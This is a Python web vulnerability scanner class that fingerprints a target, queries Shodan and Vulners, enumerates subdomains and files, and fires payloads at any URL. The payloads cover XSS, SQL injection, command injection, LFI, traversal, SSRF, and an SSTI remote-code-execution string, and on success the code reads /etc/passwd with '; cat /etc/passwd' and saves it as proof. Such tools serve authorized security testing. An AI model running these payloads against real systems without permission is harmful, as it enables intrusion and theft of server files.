from Wappalyzer import Wappalyzer, WebPage
from urllib.parse import urlparse, quote_plus
# import dns.resolver
import requests
import vulners
import shodan
import base64
import socket
import json
import os


class Scanner:
    def __init__(self, params):
        self.params = params

    def full_scan(self, url):
        return {
            "checked_url": url,
            "technology": self.scan_for_technologies(url),
            "vuln": self.scan_for_vuln(url),
            "server_version": self.scan_for_server_version(url),
            "domain_information": self.domain_information(url),
            "port_discovery": self.port_discovery(url),
            "dns_record": self.dns_record(url),
            "scan_files": self.enum_files(url),
            "subdomain_scan": self.subdomain_scan(url),
            "exploit_info": self.exploit_info(url),
            "mitigation_info": self.mitigation_info(url)
        }

    def scan_for_technologies(self, url):
        webpage = WebPage.new_from_url(url)
        wappalyzer = Wappalyzer.latest()
        res = wappalyzer.analyze_with_versions_and_categories(webpage)

        return res

    def domain_information(self, url):
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)

        SKey = self.params['s_key']
        SApi = shodan.Shodan(SKey)

        info = json.dumps(SApi.host(ip))

        with open('output_domain_info.json', 'w') as domainInfo:
            domainInfo.writelines(info)

        return 'Visit /domain'

    def anonymous_ftp_login(url):
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)

        try:
            import ftplib
            server = ftplib.FTP()
            server.connect(ip, 21)
            login = server.login('Anonymous', '')
            if '230' in login:
                return "FTP Anonymous Login"
            else:
                return ""
        except:
            return ""

    def port_discovery(self, url):
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)
        """for port in range(1, 65535):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = s.connect_ex((ip, port))
            if result == 0:
                with open('ports_opened.txt', 'w') as ports:
                    write = f'Port - {port} - Opened'
                    ports.writelines(write)
                # reading the file with ports result
                with open('ports_opened.txt', 'r') as ports:
                    read = ports.readlines()
                    return read
            s.close()"""
        SKey = self.params['s_key']
        SApi = shodan.Shodan(SKey)

        SInfo = SApi.host(ip)
        ports = json.dumps(SInfo['ports'])

        return ports

    def dns_record(self, url):
        domain = urlparse(url).netloc

        """A_RECORD = dns.resolver.query(domain,'A')

        for val in A_RECORD:
            data = json.dumps({
                'A RECORD': val.to_text()
            })

            return data"""
        WKey = self.params['w_key']
        WApi = "https://reverse-dns.whoisxmlapi.com/api/v1"

        data_TXT = json.dumps({
            "apiKey": WKey,
            "limit": 1000,
            "recordType": "TXT",
            "terms": [{
                "field": "domain",
                "term": domain
            }]
        })
        data_SOA = json.dumps({
            "apiKey": WKey,
            "limit": 1000,
            "recordType": "SOA",
            "terms": [{
                "field": "domain",
                "term": domain
            }]
        })
        data_CNAME = json.dumps({
            "apiKey": WKey,
            "limit": 1000,
            "recordType": "CNAME",
            "terms": [{
                "field": "domain",
                "term": domain
            }]
        })

        headers = {
            'Content-Type': 'application/json'
        }

        req_TXT = requests.post(WApi, headers=headers, data=data_TXT, verify=False)
        req_CNAME = requests.post(WApi, headers=headers, data=data_CNAME, verify=False)
        req_SOA = requests.post(WApi, headers=headers, data=data_SOA, verify=False)

        if req_TXT.status_code == 200 and req_CNAME.status_code == 200 and req_SOA.status_code == 200:
            res_TXT = json.dumps(req_TXT.json())
            res_SOA = json.dumps(req_SOA.json())
            res_CNAME = json.dumps(req_CNAME.json())

            full_data = json.dumps({
                "TXT RECORDS": [res_TXT],
                "SOA RECORDS": [res_SOA],
                "CNAME RECORDS": [res_CNAME]
            })

            with open("dnsrecords.json", "w") as dnsrecords:
                dnsrecords.writelines(full_data)

            return full_data
        else:
            return "Unable To Gather DNS Records"

    def scan_for_vuln(self, url):
        test1 = Scanner.test_xss(url)
        test2 = Scanner.test_ssti(url)
        test3 = Scanner.test_htmli(url)
        test4 = Scanner.test_sqli(url)
        test5 = Scanner.test_lfi(url)
        test6 = Scanner.test_cmdi(url)
        test7 = Scanner.test_ssrf(url)
        test8 = Scanner.test_dtraversal(url)
        test9 = Scanner.test_openredirection(url)
        test10 = Scanner.anonymous_ftp_login(url)

        return f"{test1} , {test2} , {test3}, {test4}, {test5}, {test6}, {test7}, {test8}, {test9} , {test10}"

    def scan_for_server_version(self, url):
        req = requests.get(url, verify=False)
        headers = req.headers
        server = headers['Server']

        return server

    """def history_information(self, url):
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)

        SKey = self.params['s_key']
        SApi = shodan.Shodan(SKey)

        info = json.dumps(SApi.host(ip))

        return info"""

    def exploit_info(self, url):
        req = requests.get(url)
        headers = req.headers

        server = headers["Server"]

        if server == '':
            return "No Server Version Found! Or Type!"
        else:
            VKey = self.params["v_key"]  # get api key by going to https://vulners.com
            VApi = vulners.Vulners(api_key=VKey)

            search = VApi.searchExploit(server)
            search = json.dumps(search, indent=2)

            os.system(f"touch output_exploit_search.json")
            with open(f"output_exploit_search.json", "w") as exploitResult:
                exploitResult.writelines(search)

            return f"Visit /output"

    def mitigation_info(self, url):
        payloadxss = "<script>document.write('xss');</script>"
        payloadssti = "{{7*7}}"
        payloadhtmli = "<h1>htmlinjection</h1>"

        reqxss = requests.get(f"{url}{payloadxss}", verify=False)
        reqssti = requests.get(f"{url}{payloadssti}", verify=False)
        reqhtmli = requests.get(f"{url}{payloadhtmli}", verify=False)

        return "Visit /output"

    def test_ssti(url):
        payload1 = "{{7*'7'}}"
        payload2 = "${1000+337}"
        payload3 = "#{1000+337}"
        payload4 = "${{7*'7'}}"
        rce_payload = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"

        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        tattempt = f"{url}{payload3}"
        frattempt = f"{url}{payload4}"

        req1 = requests.get(fattempt, verify=False)
        req2 = requests.get(sattempt, verify=False)
        req3 = requests.get(tattempt, verify=False)
        req4 = requests.get(frattempt, verify=False)

        positive = "SSTI(Server Side Template Injection)"

        # print(req.text)

        if req1.status_code == 200 and req2.status_code == 200 and req3.status_code == 200 and req4.status_code == 200:
            if "7777777" in req1.text or '49' in req1.text:
                attempt = f"{url}{rce_payload}"
                req = requests.get(attempt, verify=False)
                if "root:x" in req.text:
                    return "SSTI + RCE"
                else:
                    return positive
            elif "1337" in req2.text:
                return positive
            elif "1337" in req3.text:
                return positive
            elif "7777777" in req4.text or '49' in req4.text:
                return positive
            else:
                return ""
        else:
            return ""

    def test_xss(url):
        fattempt = f"{url}<script>document.write('xss');</script>"
        sattempt = f"{url}javascript:document.write('XSS');"
        tattempt = f"{url};document.write('XSS');//"
        req1 = requests.get(fattempt, verify=False)
        req2 = requests.get(sattempt, verify=False)
        req3 = requests.get(tattempt, verify=False)
        if req1.status_code == 200 or req2.status_code == 200 or req3.status_code == 200:
            if "xss" in req1.text or 'xss' in req2.text or 'xss' in req3.text:
                # print(req.text)
                return "XSS"
            else:
                return ""
        else:
            return ""

    def test_htmli(url):
        fattempt = f"{url}<h1 align='center' style='color:red;'>htmlinjection</h1>"
        req = requests.get(fattempt, verify=False)
        if req.status_code == 200:
            if "htmlinjection" in req.text:
                # print(req.text)
                return "HTML INJECTION"
            else:
                return ""
        else:
            return ""

    def test_sqli(url):
        payload = "' or 1=1 "
        fattempt = f"{url}{payload}"
        req = requests.get(fattempt, verify=False)
        if req.status_code == 200:
            if 'error' in req.text or 'SQL' in req.text or 'syntax' in req.text or 'PDOException' in req.text or 'SQLSTATE[' in req.text:
                # print(req.text)
                return "SQL INJECTION"
            else:
                return ""
        else:
            return ""

    """
    def test_lfi(url):
        payload1 = "../../../../../../../../../../../../etc/passwd"
        payload2 = "..//..//..//..//..//..//..//..//..//../etc/passwd"
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"

        req1 = requests.get(fattempt)
        req2 = requests.get(sattempt)

        if req1.status_code == 200 and req2.status_code == 200:
            if "home/"in req1.text or "home/" in req2.status_code:
                return "LFI(Local File Inclusion)"
            else:
                return ""
        else:
            return ""
    """

    def test_cmdi(url):
        payload1 = "; echo 'aGVsbG8K'|base64 -d;"
        payload2 = "\necho 'aGVsbG8K'|base64 -d;"
        payload3 = "@(1000+337)"
        payload4 = "system('echo aGVsbG8K|base64 -d')"
        payload5 = "echo 'pewpewpew'"
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        tattempt = f"{url}{payload3}"
        ftattempt = f"{url}{payload4}"
        xattempt = f"{url}{payload5}"

        req1 = requests.get(fattempt, verify=False)
        req2 = requests.get(sattempt, verify=False)
        req3 = requests.get(tattempt, verify=False)
        req4 = requests.get(ftattempt, verify=False)
        req5 = requests.get(xattempt, verify=False)

        if req1.status_code == 200 or req2.status_code == 200 or req3.status_code == 200 or req4.status_code == 200:
            if 'hello' in req1.text or 'hello' in req2.text or 'hello' in req4.text:
                payload = "; cat /etc/passwd"
                full = f"{url}{payload}"
                req = requests.get(full, verify=False)
                with open("os_cmdi_proof.html", "w") as oscmdi_proof:
                    oscmdi_proof.writelines(req.text)
                return "OS Command Injection"
            elif '1337' in req3.text:
                return "OS Command Injection"
            else:
                return ""
        elif req5.status_code == 200:
            if 'pewpewpew' in req5.text:
                payload = ";cat /etc/passwd"
                full = f"{url}{payload}"
                req = requests.get(full, verify=False)
                with open("os_cmdi_proof.html", "w") as oscmdi_proof:
                    oscmdi_proof.writelines(req.text)
                return "OS Command Injection"
            else:
                return ""
        else:
            return ""

    def test_lfi(url):
        # declaring payloads
        payload1 = "../../../../../../../../../../etc/passwd"
        payload2 = "/etc/passwd"
        payload3 = base64.b64encode(payload2.encode('utf-8'))
        payload3 = str(payload3, 'utf-8')
        payload4 = base64.b64encode(payload1.encode('utf-8'))
        payload4 = str(payload4, 'utf-8')
        payload5 = quote_plus(payload1)
        payload6 = quote_plus(payload2)
        # declaring full URL
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        tattempt = f"{url}{payload3}"
        ftattempt = f"{url}{payload4}"
        fhattempt = f"{url}{payload5}"
        sxattempt = f"{url}{payload6}"
        # sending requests and checking vulnerability status
        req1 = requests.get(fattempt, verify=False)
        req2 = requests.get(sattempt, verify=False)
        req3 = requests.get(tattempt, verify=False)
        req4 = requests.get(ftattempt, verify=False)
        req5 = requests.get(fhattempt, verify=False)
        req6 = requests.get(sxattempt, verify=False)
        # print(req.text)
        if req1.status_code == 200 or req2.status_code == 200 or req3.status_code == 200 or req4.status_code == 200 or req5.status_code == 200 or req6.status_code == 200:
            if 'root' in req1.text or 'root' in req2.text or 'root' in req3.text or 'root' in req4.text or 'root' in req5.text or 'root' in req6.text:
                with open("lfi_proof.html", "w") as lfi_proof:
                    lfi_proof.writelines(req1.text)
                return "LFI(Local File Inclusion)"
            else:
                return ""
        else:
            if 'root:x:' in req1.text or 'root:x:' in req2.text or 'root:x:' in req3.text or 'root:x:' in req4.text or 'root:x:' in req5.text or 'root:x:' in req6.text:
                with open("lfi_proof.html", "w") as lfi_proof:
                    lfi_proof.writelines(req1.text)
                return "LFI(Local File Inclusion)"
            else:
                return ""

    def test_dtraversal(url):
        payload1 = quote_plus(quote_plus("/../../../../../../../../../../etc/passwd"))
        payload2 = quote_plus(quote_plus("/\//\..\/..\/..\/..\/..\/..\/..\/..\/..\/etc/passwd"))
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        req1 = requests.get(fattempt, verify=False)
        req2 = requests.get(sattempt, verify=False)
        if req1.status_code == 200 and req2.status_code == 200:
            if 'root:x:' in req1.text or 'root:x:' in req2.text:
                return 'Directory Path Traversal'
            else:
                return ''
        else:
            return ''

    def test_ssrf(url):
        payload1 = "file:///etc/passwd"
        payload2 = "file://\/\/etc/passwd"
        paylaod3 = "http://127.0.0.1/phpmyadmin"
        payload4 = "http://127.0.0.1/admin"
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        tattempt = f"{url}{paylaod3}"
        ftattempt = f"{url}{payload4}"
        req1 = requests.get(fattempt, verify=False)
        req2 = requests.get(sattempt, verify=False)
        req3 = requests.get(tattempt, verify=False)
        req4 = requests.get(ftattempt, verify=False)
        if req1.status_code == 200 or req2.status_code == 200 or req3.status_code == 200 or req4.status_code == 200:
            if 'root' in req1.text or 'root:x:' in req1.text or 'root:!:' in req1.text:
                return "SSRF(Server Side Request Forgery) - file"
            elif 'root' in req2.text or 'root:x:' in req2.text or 'root:!:' in req2.text:
                return "SSRF(Server Side Request Forgery) - file"
            # elif 'phpmyadmin' in req3.text or 'password' in req3.text:
            #    return "SSRF(Server Side Request Forgery)"
            # elif 'AdminLTE' in req4.text or 'password' in req4.text or 'username' in req4.text or 'login' in req4.text:
            #   return "SSRF(Server Side Request Forgery)"
            else:
                return ""
        else:
            return ""

    def test_openredirection(url):
        fpayload = "&next=tahaafarooq.me"
        spayload = "&next=https://tahaafarooq.me"
        tpayload = "https://tahaafarooq.me/"

        fattempt = f"{url}{fpayload}"
        sattempt = f"{url}{spayload}"
        tattempt = f"{url}{tpayload}"

        req1 = requests.get(fattempt, verify=False)
        req2 = requests.get(sattempt, verify=False)
        req3 = requests.get(tattempt, verify=False)

        if req1.status_code == 200 or req1.status_code == 302 and req2.status_code == 200 or req2.status_code == 302 and req3.status_code == 200 or req3.status_code == 302:
            if 'pewpew' in req1.text or 'pewpew' in req2.text or 'pewpew' in req3.text:
                return "Open Redirect"
            else:
                return ""
        else:
            return ""

    def check_gitfiles(url):
        domain = urlparse(url).netloc
        scheme = urlparse(url).scheme
        full = f"{scheme}://{domain}/.git"
        req = requests.get(full, verify=False)
        if req.status_code == 200:
            return f"{full} Found"
        else:
            return ""

    """
    Just another function to perform a dictionary
    attack on the URL upon the directories and discover
    suspicious files
    """

    def scan_files(self, url):
        wordlist = open("dir-wordlist.txt", "r")
        lines = wordlist.readlines()
        chk_git = Scanner.check_gitfiles(url)
        for line in lines:
            domain = urlparse(url).netloc
            scheme = urlparse(url).scheme
            full = f"{scheme}://{domain}/{line}"
            req = requests.get(full, verify=False)
            if req.status_code == 200:
                return "Found {line}"
            else:
                return f"Nothing Suspicious Found | {chk_git}"

    def enum_files(self, url):
        wordlist = open("files-wordlist.txt", "r")
        lines = wordlist.readlines()
        chk_git = Scanner.check_gitfiles(url)
        for line in lines:
            scheme = urlparse(url).scheme
            domain = urlparse(url).netloc
            full = f"{scheme}://{domain}/{line}"
            req = requests.get(full, verify=False)
            if req.status_code == 200:
                with open("found_files.txt", "w") as found:
                    found.writelines(line)
                return "Visit /suspicious"
            else:
                return f"Nothing Suspicious | {chk_git}"

    """
    def subdomain_scan(self,url):
        domain = urlparse(url).netloc
        scheme = urlparse(url).scheme
        with open("subdomains.txt","r") as wordlist:
            name = wordlist.read()
            subdomain = name.splitlines()
            for subdom in subdomain:
                URL = f"{scheme}://{subdom}.{domain}"
                try:
                    req = requests.get(URL)
                    if req.status_code == 200:
                        with open("subdomains_found.txt","w") as output:
                            output.writelines(f'{URL}')
                        with open("subdomains_found.txt","r") as output:
                            read = output.read()
                            read = read.splitlines()
                            return read
                except requests.ConnectionError:
                    pass
    """

    def subdomain_scan(self, url):
        subdomains = []
        domain = urlparse(url).netloc
        output = 'subdomains.txt'

        req = requests.get(f'https://crt.sh/?q=%.{domain}&output=json')

        if req.status_code != 200:
            return 'Unable to fetch Subdomains from this domain'

        for (key, value) in enumerate(req.json()):
            subdomains.append(value['name_value'])

        subs = sorted(set(subdomains))
        for s in subs:
            if output is not None:
                Scanner.write_to_file_subs(s, output)

        return "Visit /subdomains"

    def write_to_file_subs(subdomain, output_file):
        with open(output_file, 'w') as file:
            file.write(str(subdomain))
            file.close()


class PostScanner:
    def __init__(self, params):
        self.params = params

    def full_test(self, url, data):
        pass
